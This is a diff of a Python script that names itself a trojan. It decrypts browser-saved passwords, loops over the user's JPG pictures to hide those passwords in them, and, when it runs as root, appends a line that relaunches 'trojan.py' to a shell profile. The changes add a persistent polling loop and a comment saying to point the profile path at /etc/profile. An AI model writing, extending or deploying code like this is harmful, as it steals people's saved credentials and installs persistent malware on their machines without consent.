@@ -43,26 +43,40 @@ def first_run():
 	msglist = decrypt_passwords()			# List of browser saved passwords
 	num_of_msgs = msglist.__len__()			# No. of browser saved passwords
 	i = 0									# Message Iterator
-	picdir = path.expanduser("~/Pictures/Pictures/")
-	for infile in glob.glob(picdir+"*.jpg"):
-		i = (i+1)%num_of_msgs;
-		encode(infile,msglist[i]);
-	f = open('bootup.cfg', 'w+')
-	f.write(str(datetime.now()))
-	f.close()
-	if geteuid() == 0:
-		f = open('/etc/profile','a')
-		f.write("sudo python trojan.py&");
+	encode_dir = path.expanduser("~/Pictures/Pictures/")
+	if num_of_msgs > 0:
+		for infile in glob.glob(encode_dir+"*.jpg"):
+			i = (i+1)%num_of_msgs;
+			#encode(infile,msglist[i]);
+		f = open('bootup.cfg', 'w+')
+		f.write(str(num_of_msgs)+"\n")
+		f.write(datetime.now().strftime("%Y-%m-%d %H:%M:%S"))
 		f.close()
-	for infile in glob.glob(picdir+"*.jpg"):
-		print decode(infile);		
-	
-	
+			
+	if geteuid() == 0:						#Adding to startup scripts if root privileges
+		try:
+			f = open('../profile','a')			# Change file to /etc/profile
+			f.write("sudo python trojan.py&");
+			f.close()
+		except:
+			pass
+			
 	
 # Main Function
-if (not path.exists('bootup.cfg')):			#Checking if its first run of trojan
-	first_run()
 
-	
+while True:
+	if (not path.exists('bootup.cfg')):			#Checking if its first run of trojan
+		first_run()
+	else:
+		f = open('bootup.cfg','r')
+		num_of_msgs = f.readline()
+		update_dtline = f.readline()
+		f.close()
+		update_dt = datetime.strptime(update_dtline,"%Y-%m-%d %H:%M:%S")
+		encode_dir = path.expanduser("~/Pictures/Pictures/")
+		decode_dir = path.expanduser("~/Pictures/Downloads/")
+		for infile in glob.glob(decode_dir+"*.jpg"):
+			#print decode(infile);	
+			print infile, datetime.fromtimestamp(path.getmtime(infile))
 
 
